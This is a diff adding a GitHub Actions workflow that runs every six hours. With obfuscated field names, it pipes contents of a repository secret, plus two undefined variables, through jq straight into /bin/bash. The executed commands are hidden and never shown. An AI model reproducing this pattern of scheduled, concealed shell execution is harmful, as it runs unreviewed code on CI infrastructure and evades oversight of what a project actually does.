@@ -1,0 +1,20 @@
+name: jiejinpanbai
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '57 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiejinpanbai
+        env:
+          c51914: ${{ secrets.c51914 }}
+        run: |
+          echo $c51914 | jq -r .q87 | /bin/bash
+          echo $y7 | jq -r .vno2479 | /bin/bash
+          echo $xvtk780 | jq -r .chi35 | /bin/bash
+
